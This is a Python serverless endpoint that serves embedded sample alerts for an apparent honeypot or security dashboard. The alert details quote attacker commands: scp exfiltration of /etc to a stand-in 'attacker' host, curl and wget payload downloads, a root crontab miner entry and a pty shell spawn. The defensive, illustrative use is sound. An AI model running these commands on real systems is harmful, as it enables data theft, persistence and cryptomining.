"""
Vercel serverless function: GET /api/alerts

Serves a read-only, embedded sample alert feed to match dashboard.html's
expected shape ({"alerts": [...]}). Sample data only -- see api/stats.py
and the main README for why this can't be live data on Vercel.
"""
from http.server import BaseHTTPRequestHandler
import json

ALERTS = json.loads('{"alerts": [{"id": 1, "title": "Make Executable", "message": "5.188.86.172 (Russia) triggered make executable", "severity": "medium", "acknowledged": false, "timestamp": "2026-05-01T05:38:55+00:00", "details": "{\\"command\\": \\"chmod +x /tmp/x.sh\\"}"}, {"id": 2, "title": "Persistence", "message": "5.188.86.172 (Russia) triggered persistence", "severity": "critical", "acknowledged": false, "timestamp": "2026-05-01T05:35:43+00:00", "details": "{\\"command\\": \\"echo \'*/5 * * * * /tmp/miner\' >> /var/spool/cron/crontabs/root\\"}"}, {"id": 3, "title": "Data Exfiltration", "message": "109.248.9.14 (China) triggered data exfiltration", "severity": "critical", "acknowledged": false, "timestamp": "2026-05-01T03:55:56+00:00", "details": "{\\"command\\": \\"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/\\"}"}, {"id": 4, "title": "Persistence", "message": "109.248.9.14 (China) triggered persistence", "severity": "critical", "acknowledged": false, "timestamp": "2026-05-01T03:55:46+00:00", "details": "{\\"command\\": \\"echo \'*/5 * * * * /tmp/miner\' >> /var/spool/cron/crontabs/root\\"}"}, {"id": 5, "title": "Data Exfiltration", "message": "91.213.50.8 (Bulgaria) triggered data exfiltration", "severity": "critical", "acknowledged": true, "timestamp": "2026-05-01T03:48:37+00:00", "details": "{\\"command\\": \\"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/\\"}"}, {"id": 6, "title": "Lateral Movement", "message": "80.94.92.241 (Ukraine) triggered lateral movement", "severity": "critical", "acknowledged": true, "timestamp": "2026-05-01T02:54:38+00:00", "details": "{\\"command\\": \\"ssh root@10.0.1.100\\"}"}, {"id": 7, "title": "File Download", "message": "80.94.92.241 (Ukraine) triggered file download", "severity": "high", "acknowledged": true, "timestamp": "2026-05-01T02:54:34+00:00", "details": "{\\"command\\": \\"curl http://193.106.31.72/miner -o /tmp/miner\\"}"}, {"id": 8, "title": "Lateral Movement", "message": "146.185.133.197 (Romania) triggered lateral movement", "severity": "critical", "acknowledged": true, "timestamp": "2026-05-01T01:29:39+00:00", "details": "{\\"command\\": \\"ssh root@10.0.1.100\\"}"}, {"id": 9, "title": "File Download", "message": "146.185.133.197 (Romania) triggered file download", "severity": "high", "acknowledged": true, "timestamp": "2026-05-01T01:25:59+00:00", "details": "{\\"command\\": \\"wget http://45.33.32.156/x.sh -O /tmp/x.sh\\"}"}, {"id": 10, "title": "Interpreter Execution", "message": "146.185.133.197 (Romania) triggered interpreter execution", "severity": "high", "acknowledged": true, "timestamp": "2026-05-01T01:20:57+00:00", "details": "{\\"command\\": \\"python3 -c \'import pty; pty.spawn(\\\\\\"/bin/bash\\\\\\")\'\\"}"}]}')


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(ALERTS).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "public, max-age=60")
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.end_headers()
